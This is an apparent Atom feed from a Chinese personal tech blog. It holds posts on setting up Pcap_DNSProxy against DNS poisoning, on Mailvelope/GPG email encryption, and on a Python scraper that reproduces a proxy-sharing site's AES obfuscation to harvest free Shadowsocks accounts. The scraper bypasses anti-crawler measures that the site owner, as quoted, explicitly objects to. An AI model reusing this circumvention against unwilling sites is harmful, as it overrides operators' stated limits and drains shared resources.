<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XiaoTaoist&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-05-07T05:43:23.536Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>taoist</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用Pcap_DNS搭建本地防污染DNS服务器</title>
    <link href="http://yoursite.com/2018/04/14/Pcap-DNSProxy-md/"/>
    <id>http://yoursite.com/2018/04/14/Pcap-DNSProxy-md/</id>
    <published>2018-04-14T13:42:48.000Z</published>
    <updated>2018-05-07T05:43:23.536Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><h2 id="DNS介绍"><a href="#DNS介绍" class="headerlink" title="DNS介绍"></a>DNS介绍</h2><p> 我们使用的互联网是基于TCP/IP协议的，而TCP/IP的基石是IP地址，所以在网络上进行通讯时只能识别如“202.96.134.133”之类的IP地址，但对于人类来说，记住很多IP地址是件很困难的事情，于是发明了DNS（Domain Name System，域名系统），现在我们访问网站时，只需要输入相应的域名，就能看到所需要的页面。这是因为互联网上有一种叫“DNS服务器”的计算机会自动把我们的域名“翻译”成了相应的IP地址，并告诉我们。以访问百度为例<code>www.baidu.com</code>，系统会向DNS服务器（如<code>8.8.8.8</code>）发送请求：”嘿，我要用度娘，赶紧告诉我它的IP地址”，DNS服务器收到请求后，就会回复我们：”这是百度的ip地址，请查收“，系统收到IP地址后，便会和百度的服务器进行通信，最后得到我们看到的网页。</p> <a id="more"></a><p> <img src="/img/dns_dig.png" alt="dig"></p><h2 id="DNS的问题"><a href="#DNS的问题" class="headerlink" title="DNS的问题"></a>DNS的问题</h2><p>一般运营商（联通，电信，移动）都会搭建自己的DNS服务器，以提高响应速度，但是运营商会为了为了某些目的，会对DNS做一些手脚，导致我们无法通过域名解析出正确的IP地址。常用的手段有：DNS劫持和DNS污染。网上很多文章建议将DNS设为公共DNS（如阿里的<code>223.5.5.5</code>,谷歌的<code>8.8.8.8</code>,腾讯的<code>119.29.29.29</code>），但是你们也太小看运营商了，以移动为例：他们会对UDP53（DNS默认向53端口用UDP包发送查询请求）进行抢答。随便输入一个IP地址（8.1.2.3不是任何公共DNS服务器地址），都能给你返回查询结果。<br><img src="/img/dns_fake.png" alt="dns_fake"></p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>这里介绍使用<a href="https://github.com/chengr28/Pcap_DNSProxy" target="_blank" rel="noopener">Pcap_DNSProxy</a>搭建防污染防劫持的DNS服务器。Win/MacOS都有编译好的二进制文件，可以直接<a href="https://github.com/chengr28/Pcap_DNSProxy/releases" target="_blank" rel="noopener">下载</a>使用。</p><p>下文介绍Arch Linux下的Pcap_DNSProxy的编译与使用，其他环境请参考chengr28的<a href="https://github.com/chengr28/Pcap_DNSProxy/tree/master/Documents" target="_blank" rel="noopener">官方文档</a></p><ul><li><p>安装编译环境</p><blockquote><p>sudo pacman -S gcc cmake libpcap libsodium openssl git bind-tools</p></blockquote></li><li><p>下载源码</p><blockquote><p>git clone <a href="https://github.com/chengr28/Pcap_DNSProxy.git" target="_blank" rel="noopener">https://github.com/chengr28/Pcap_DNSProxy.git</a></p></blockquote></li><li><p>编译生成可执行文件</p><blockquote><p>cd Pcap_DNSProxy/Source/Auxiliary/Scripts #进入指定目录<br>chmod 755 CMake_Build.sh #赋予脚本执行权限<br>./CMake_Build.sh         #执行编译程序</p></blockquote></li><li><p>编译成功后，<code>Pcap_DNSProxy/Source/Release</code> 目录下的文件即目标程序和配置文件，我们先来测试一下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ../../Release                      <span class="comment">#切换到Relese目录</span></span><br><span class="line">sudo ./Pcap_DNSProxy --<span class="built_in">disable</span>-daemon <span class="comment">#调试运行</span></span><br><span class="line">dig @127.0.0.1 github.com         <span class="comment">#若能正常返回查询结果，即正常工作</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="设置开机自启"><a href="#设置开机自启" class="headerlink" title="设置开机自启"></a>设置开机自启</h2><ul><li>进入<code>Release</code>目录并编辑 Pcap_DNSProxy.service 文件，编辑完成后保存： </li></ul><blockquote><p>WorkingDirectory= 项为程序所在目录的绝对路径(例如:/home/my/Pcap_DNSProxy/Source/Release)<br>ExecStart= 项为程序所在目录的绝对路径，并在最后加上程序的名称(例如：/home/my/Pcap_DNSProxy/Source/Release/Pcap_DNSProxy)</p></blockquote><ul><li><p>自动安装到系统，并设为开机自启</p><blockquote><p>sudo ./Linux_Install.Systemd.sh</p></blockquote></li><li><p>修改系统DNS设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">echo</span> <span class="string">"nameserver 127.0.0.1\n"</span> | sudo tee /etc/resolv.conf <span class="comment">#修改系统DNS为127.0.0.1</span></span><br><span class="line">&gt;sudo chattr +i /etc/resolv.conf <span class="comment">#其他网络管理程序可能会修改这个文件,设置特殊权限以避免被其他程序改动</span></span><br></pre></td></tr></table></figure></li><li><p>再来测试一下,类似的结果即配置成功<br><img src="/img/dns_suc.png" alt="dns_success"></p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li>正常情况，Pcap_DNSProxy 可以做到开箱即用，你想做一些调整的话，可以修改配置文件<code>Config.conf</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Outgoing Protocol = IPv4  + UDP + TCP <span class="comment">#优先使用UDP，提高解析速度</span></span><br><span class="line">EDNS Label = 1 <span class="comment">#EDNS 标签支持</span></span><br><span class="line">SOCKS Proxy = 1 <span class="comment">#允许使用Sock5代理，以远程解析DNS请求</span></span><br><span class="line">SOCKS IPv4 Address = 127.0.0.1:1080</span><br></pre></td></tr></table></figure></li></ul><p>更详细配置请阅读<a href="https://github.com/chengr28/Pcap_DNSProxy/blob/master/Documents/ReadMe.zh-Hans.txt" target="_blank" rel="noopener">文档</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F</a></li><li><a href="https://www.v2ex.com/t/442340#reply15" target="_blank" rel="noopener">https://www.v2ex.com/t/442340#reply15</a></li><li><a href="https://www.v2ex.com/t/360775" target="_blank" rel="noopener">https://www.v2ex.com/t/360775</a></li><li><a href="https://wiki.archlinux.org/index.php/Resolv.conf" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Resolv.conf</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;h2 id=&quot;DNS介绍&quot;&gt;&lt;a href=&quot;#DNS介绍&quot; class=&quot;headerlink&quot; title=&quot;DNS介绍&quot;&gt;&lt;/a&gt;DNS介绍&lt;/h2&gt;&lt;p&gt; 我们使用的互联网是基于TCP/IP协议的，而TCP/IP的基石是IP地址，所以在网络上进行通讯时只能识别如“202.96.134.133”之类的IP地址，但对于人类来说，记住很多IP地址是件很困难的事情，于是发明了DNS（Domain Name System，域名系统），现在我们访问网站时，只需要输入相应的域名，就能看到所需要的页面。这是因为互联网上有一种叫“DNS服务器”的计算机会自动把我们的域名“翻译”成了相应的IP地址，并告诉我们。以访问百度为例&lt;code&gt;www.baidu.com&lt;/code&gt;，系统会向DNS服务器（如&lt;code&gt;8.8.8.8&lt;/code&gt;）发送请求：”嘿，我要用度娘，赶紧告诉我它的IP地址”，DNS服务器收到请求后，就会回复我们：”这是百度的ip地址，请查收“，系统收到IP地址后，便会和百度的服务器进行通信，最后得到我们看到的网页。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Python爬取某站科学上网帐号</title>
    <link href="http://yoursite.com/2018/04/07/python-getss/"/>
    <id>http://yoursite.com/2018/04/07/python-getss/</id>
    <published>2018-04-07T10:31:27.000Z</published>
    <updated>2018-05-07T05:44:59.464Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无意间发现了一个<a href="https://free-ss.site/" target="_blank" rel="noopener">SS帐号分享站</a>，但每次都需要手动获取帐号信息太麻烦了，这里用Python写一个爬虫来自动获取帐号信息。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先来看一下网站源码。站长做了防爬处理，数据并不保存在源代码中，并且针对爬虫常见的模拟浏览器手段进行检测。</p><a id="more"></a><p><img src="/img/free-ss_1.png" alt="free-ss_view"><br>看一下网络连接，发现了一个ss.json的get请求，内容居然帐号信息。<br><img src="/img/free-ss_2.png" alt="free-ss_json"><br>本以为是站长特意留下的API接口，测试之后才发现里面的帐号信息都不能正常使用。现在只能老老实实的去分析源码了。<br>网站关键部分是用javascript写的。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用a，b 分别初始化x（key）,y(iv)</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">'1a52316b1ed72c8f'</span>;<span class="keyword">var</span> b = <span class="string">'cd3e6a7914085b2f'</span>;<span class="keyword">var</span> c = <span class="string">'327bd961633a77c4'</span>;</span><br><span class="line"><span class="keyword">var</span> x = CryptoJS.enc.Latin1.parse(a);</span><br><span class="line"><span class="keyword">var</span> y = CryptoJS.enc.Latin1.parse(b);</span><br><span class="line"></span><br><span class="line"><span class="comment">//post方法提交a,b,c,得到密文data</span></span><br><span class="line">$.post(<span class="string">"data.php"</span>,&#123;<span class="attr">a</span>:a,<span class="attr">b</span>:b,<span class="attr">c</span>:c&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//解密</span></span><br><span class="line">    <span class="keyword">var</span> dec = CryptoJS.AES.decrypt(data,x,&#123;<span class="attr">iv</span>:y,<span class="attr">mode</span>:CryptoJS.mode.ECB,<span class="attr">padding</span>:CryptoJS.pad.Pkcs7&#125;);</span><br><span class="line">    <span class="comment">//格式化成json格式方便后面使用</span></span><br><span class="line">    <span class="keyword">var</span> tbdt = $.parseJSON(dec.toString(CryptoJS.enc.Utf8))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到流程如下</p><blockquote><ol><li>判断是否是正常的浏览器，如果正常，就用POST方法提交正确的a,b,c 参数，服务端会返回一串AES密文</li><li>用a，b分别初始化key，iv，用Crypto－js库去解密返回的数据</li><li>解密后，重新排版，优化显示</li></ol></blockquote><p>这里我们用Python去模拟整个过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0'</span>&#125;</span><br><span class="line">url= <span class="string">"https://free-ss.site/"</span></span><br><span class="line">url2=<span class="string">"https://free-ss.site/data.php"</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">#获取正确的a,b,c参数</span></span><br><span class="line">s = requests.session()</span><br><span class="line">html = s.get(url,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">a,b,c = re.findall(<span class="string">r"\'(.*?)\'"</span>,html.text)[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#post提交a,b,c,得到密文</span></span><br><span class="line">p_data = &#123;<span class="string">'a'</span>:a,<span class="string">'b'</span>:b,<span class="string">'c'</span>:c&#125;</span><br><span class="line">msg = s.post(url2,headers=headers,data=p_data,timeout=<span class="number">3</span>)</span><br><span class="line">endata = base64.b64decode(msg.text) <span class="comment">#返回的是base64编码数据，先解码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#用正确的参数初始化AES，ECB模式不需要iv向量</span></span><br><span class="line">key = bytes(a,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="comment">#iv = bytes(b,encoding="utf-8")</span></span><br><span class="line">aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line"><span class="comment">#解密得到数据</span></span><br><span class="line">data ＝ aes.decrypt(endata).decode(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure><p>我们可以看到数据末尾多了一些无用字符，因为AES加密需要原始数据块是16位的倍数，不足则用按照某些标准(诸如源码中的Pkcs7)进行填充补位。<br><img src="/img/free-ss_3.png" alt="ss_data"><br>我们继续处理解密后的数据，生成ss链接以方便直接导入<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">ss_data = re.findall(<span class="string">r'&#123;.*&#125;'</span>,data)[<span class="number">0</span>] <span class="comment">#去掉多余的填充字符</span></span><br><span class="line">ss_json = json.loads(ss_data)[<span class="string">'data'</span>] <span class="comment">#json化数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ss_json:</span><br><span class="line">    <span class="comment">#ss://method:password@server:port</span></span><br><span class="line">    ss = <span class="string">"&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;"</span>.format(i[<span class="number">3</span>],i[<span class="number">4</span>],i[<span class="number">1</span>],i[<span class="number">2</span>])</span><br><span class="line">    ss_url = <span class="string">"ss://"</span>+ bytes.decode( base64.b64encode(bytes(ss,encoding=<span class="string">"utf8"</span>)) )</span><br><span class="line">    <span class="comment">#print(ss)</span></span><br><span class="line">    print(ss_url)</span><br></pre></td></tr></table></figure></p><p>后来发现网站每次使用的加密方法都是随机的，Crypto-js一共实现了AES的5种加密模式:CBC、CFB、CTR、ECB、OFB,每种都用Python实现太麻烦了，这里我们取个巧：判断加密模式，如果是ECB，则进行解密，否则重新请求网页信息。整个Demo如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0'</span>&#125;</span><br><span class="line">    url= <span class="string">"https://free-ss.site/"</span></span><br><span class="line">    url2=<span class="string">"https://free-ss.site/data.php"</span> </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        s = requests.session()</span><br><span class="line">        html = s.get(url,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        mode  = re.findall(<span class="string">r"CryptoJS.mode.(\w&#123;3&#125;)"</span>,html.text)</span><br><span class="line">        print(mode)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ECB'</span> <span class="keyword">in</span> mode:</span><br><span class="line">            a,b,c = re.findall(<span class="string">r"\'(.*?)\'"</span>,html.text)[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">            p_data = &#123;<span class="string">'a'</span>:a,<span class="string">'b'</span>:b,<span class="string">'c'</span>:c&#125;</span><br><span class="line">            msg = s.post(url2,headers=headers,data=p_data,timeout=<span class="number">3</span>)</span><br><span class="line">            endata = base64.b64decode(msg.text)</span><br><span class="line">            key = bytes(a,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">            aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">            data = aes.decrypt(endata).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            ss_data = re.findall(<span class="string">r'&#123;.*&#125;'</span>,data)[<span class="number">0</span>]</span><br><span class="line">            ss_json = json.loads(ss_data)[<span class="string">'data'</span>] </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> ss_json:</span><br><span class="line">                <span class="comment">#ss://method:password@server:port</span></span><br><span class="line">                ss = <span class="string">"&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;"</span>.format(i[<span class="number">3</span>],i[<span class="number">4</span>],i[<span class="number">1</span>],i[<span class="number">2</span>])</span><br><span class="line">                ss_url = <span class="string">"ss://"</span>+ bytes.decode( base64.b64encode(bytes(ss,encoding=<span class="string">"utf8"</span>)) )</span><br><span class="line">                <span class="comment">#print(ss)</span></span><br><span class="line">                print(ss_url)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>这里只实现了核心功能，本来想完善一下放到Github上，但无意间有看到了一个名叫<a href="https://greasyfork.org/zh-CN/scripts/37822-free-ss-site-%E7%94%9F%E6%88%90%E5%85%A8%E9%83%A8%E9%93%BE%E6%8E%A5" target="_blank" rel="noopener">free-ss.site 生成全部链接</a>的油猴脚本里有这段内容</p><blockquote><p>原站HTML代码中添加了以下内容：<br>       托各位大佬的福，本站爬虫访问量终于比真人访问量高了。本站在此谢过各位大佬。<br>       本站长深知不太可能制止各位大佬的爬虫，现恳请各位大佬在发布账号的时候做以下处理：<br>           乱序排序。人总是想偷懒的，大家都喜欢用靠前面的账号。<br>           不要测速和测延迟。人总是逐利的。大家都喜欢用高速低延迟的账号。<br>       这2点要求都是为了保护账号，让用户尽可能的分布到各个账号上。<br>       如果全国人民一起使用某个账号，几乎等同于DDoS攻击，这样账号很快就失效了。</p></blockquote><p>并且我也在网站源码里看到了:<code>本站不欢迎各种爬虫,爬虫请自重！</code>，因此放弃了这个打算。</p><p><strong>本文仅供学习交流，如有冒犯之处，联系可删。</strong></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.zhengxianjun.com/2015/05/javascript-crypto-js" target="_blank" rel="noopener">https://blog.zhengxianjun.com/2015/05/javascript-crypto-js</a></li><li><a href="https://gist.github.com/marcoslin/8026990" target="_blank" rel="noopener">https://gist.github.com/marcoslin/8026990</a></li><li><a href="https://bbs.pediy.com/thread-224363.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224363.htm</a> </li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;无意间发现了一个&lt;a href=&quot;https://free-ss.site/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SS帐号分享站&lt;/a&gt;，但每次都需要手动获取帐号信息太麻烦了，这里用Python写一个爬虫来自动获取帐号信息。&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;先来看一下网站源码。站长做了防爬处理，数据并不保存在源代码中，并且针对爬虫常见的模拟浏览器手段进行检测。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>保护你的邮件通信——Mailvelope（GPG）</title>
    <link href="http://yoursite.com/2018/03/29/gpg/"/>
    <id>http://yoursite.com/2018/03/29/gpg/</id>
    <published>2018-03-29T00:41:41.000Z</published>
    <updated>2018-04-06T14:21:06.559Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>谈到隐私保护的时候人们最常说的话就是“我没什么可藏，我光明磊落，政府监控就监控吧，我不在乎”，或者“不做亏心事，不怕鬼敲门”,更极端的想法是“反正他们知道一切，我做啥都没用。” </p><blockquote><p>爱德华·斯诺登表示：“我不在乎隐私权，因为我没什么好藏的”这样的观点，和“我不在乎言论自由，因为我没什么好说的”意思接近。当一个人说“我没什么好藏的”，实际上是在说“我不在乎自己的权利”，也就是“我不拥有权利，因为我无法为我的权利辩解”，而对权利的正确解读应该是“政府侵犯你的权利，政府才应该辩解”。[1]</p></blockquote><p>虽然在大数据时代我们很难做到完全匿名，但我们依然可以通过加密手段在一定程度上保护自己的隐私。</p><a id="more"></a><blockquote><p>加密可以保护我们的数据。无论数据是正存放在我们自己的计算机上，还是位于数据中心，或者正在通过互联网传送的途中，加密都可以提供防护。加密可以保护我们的聊天，不管是视频、语音还是文字。加密可以保护我们的隐私，可以隐藏我们的踪迹，甚至有时候，它会保护我们的性命。</p><p>这种保护是攸关我们每个人的。不需要太多解释就可以明白，加密对于活动于威权国家中的记者与人权或政治活动家的重要性。但加密同样也会保护不属于这些群体的其他人。加密抵御犯罪分子的入侵，抵御竞争对手的窃密，防止家庭成员或者邻居偷窥。加密防御的不只是有意的攻击者，还包括没有预料到的意外情况。[2]</p></blockquote><p>下面介绍用Mailvelope在网页端上加密自己的电子邮件。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Mailvelope是一种浏览器扩展，遵守OpenPGP标准[3]可以对电子邮件和文件进行加密，解密，签名和认证。它不需要您下载或安装其他邮件客户端，就可以为WebMail用户提供端到端加密的最简单方法。<br>下载地址：<br><a href="https://chrome.google.com/webstore/detail/mailvelope/kajibbejlbohfaggdiogboambcijhkke?hl=zh-CN" target="_blank" rel="noopener">Chrome版</a><br><a href="https://addons.mozilla.org/zh-CN/firefox/addon/mailvelope/" target="_blank" rel="noopener">Firefox版</a></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul><li>安装完成后，点击Mailvelope的插件图标，点设置图标进入设置页面。<br><img src="/img/mailvelope.png" alt="Mailvelope"></li><li>这里我们生成一个新的密钥,如果你已经有GPG密钥,可以直接导入。<br><img src="/img/maillvelope_genkey.png" alt="genkey"></li><li>导出你的公钥，文本框中的内容即为你的公钥，任何可以获得你公钥的人都可以给你发加密邮件<br><img src="/img/mailvelope_pub.png" alt="pub"></li><li>导入别人的公钥，有对方的公钥才能给它发送加密邮件。<br><img src="/img/mailvelope_import.png" alt="import"></li><li>进入你的网页邮箱，如果你的邮件服务商在mailvelope默认支持列表中，在写信框中会出现一个小图标。<br><img src="/img/mailvelope_send.png" alt="send"><br>如果没有发现，请添加网站支持后，刷新页面生效。<br><img src="/img/mailvelope_add.png" alt="add"></li><li>点击小图标，会弹出对话框（这里貌似有一个bug，在弹出窗口<strong>右键单击</strong>才会<strong>显示内容</strong>）开始写内容。<br><img src="/img/mailvelope_write.png" alt="write"></li><li>撰写完成后点加密。发现已经变成了密文，即可发送给对方。(如果开启了签名，还需要输入你创建密钥时设置的密码才可以加密内容)<br><img src="/img/mailvelope_gpg.png" alt="gpg"></li><li>收到加密邮件，点一下，在弹出窗口输入你的私钥密码即可成功解密。<br><img src="/img/mailvelope_rev.png" alt="inbox"></li></ul><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul><li>Mailvelope 不会加密你的邮箱地址和对方的邮箱地址以及主题名，请不要使用真实姓名注册邮箱，如果可以尽量单独申请一个隐私性较好的邮箱服务商（比如<a href="https://mail.protonmail.com" target="_blank" rel="noopener">ProtonMail</a>）。</li><li>请妥善保存你的私钥，做好备份，以防丢失后无法解密数据</li><li>第一次给对方发送加密电子邮件时，可以放心的将你的公钥一并附上，以方便对方给你回复加密邮件。[4]</li></ul><h3 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h3><ul><li>GPG原理：<a href="https://xeodou.me/2015/09/13/how-pgp-works/" target="_blank" rel="noopener">https://xeodou.me/2015/09/13/how-pgp-works/</a></li><li>隐私工具介绍：<a href="https://cybermagicsec.github.io/privacytools-zh/" target="_blank" rel="noopener">https://cybermagicsec.github.io/privacytools-zh/</a></li><li>安全工具箱指南：<a href="https://securityinabox.org/zh/" target="_blank" rel="noopener">https://securityinabox.org/zh/</a></li><li>编程随想的隐私保护技巧：<a href="https://program-think.blogspot.com/2013/06/privacy-protection-0.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2013/06/privacy-protection-0.html</a></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] 维基百科：无所隐瞒论 <a href="https://zh.wikipedia.org/zh-sg/%E6%97%A0%E6%89%80%E9%9A%90%E7%9E%92%E8%AE%BA" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-sg/%E6%97%A0%E6%89%80%E9%9A%90%E7%9E%92%E8%AE%BA</a><br>[2] 为什么要加密：<a href="https://www.neoatlantis.org/%E7%94%B5%E5%B7%A5%E7%94%B5%E5%AD%90%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF/2016/11/18/why-encrypt.html" target="_blank" rel="noopener">https://www.neoatlantis.org/%E7%94%B5%E5%B7%A5%E7%94%B5%E5%AD%90%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF/2016/11/18/why-encrypt.html</a><br>[3] OpenPGP标准：<a href="https://tools.ietf.org/html/rfc4880" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc4880</a><br>[4] Mailvelope指南：<a href="https://securityinabox.org/en/guide/mailvelope/web/" target="_blank" rel="noopener">https://securityinabox.org/en/guide/mailvelope/web/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;谈到隐私保护的时候人们最常说的话就是“我没什么可藏，我光明磊落，政府监控就监控吧，我不在乎”，或者“不做亏心事，不怕鬼敲门”,更极端的想法是“反正他们知道一切，我做啥都没用。” &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;爱德华·斯诺登表示：“我不在乎隐私权，因为我没什么好藏的”这样的观点，和“我不在乎言论自由，因为我没什么好说的”意思接近。当一个人说“我没什么好藏的”，实际上是在说“我不在乎自己的权利”，也就是“我不拥有权利，因为我无法为我的权利辩解”，而对权利的正确解读应该是“政府侵犯你的权利，政府才应该辩解”。[1]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;虽然在大数据时代我们很难做到完全匿名，但我们依然可以通过加密手段在一定程度上保护自己的隐私。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Privacy" scheme="http://yoursite.com/tags/Privacy/"/>
    
  </entry>
  
  <entry>
    <title>Manjaro Linux 配置Intel与Nvidia双显卡切换</title>
    <link href="http://yoursite.com/2018/03/19/Bumblebee/"/>
    <id>http://yoursite.com/2018/03/19/Bumblebee/</id>
    <published>2018-03-19T10:09:03.000Z</published>
    <updated>2018-03-31T02:32:57.223Z</updated>
    
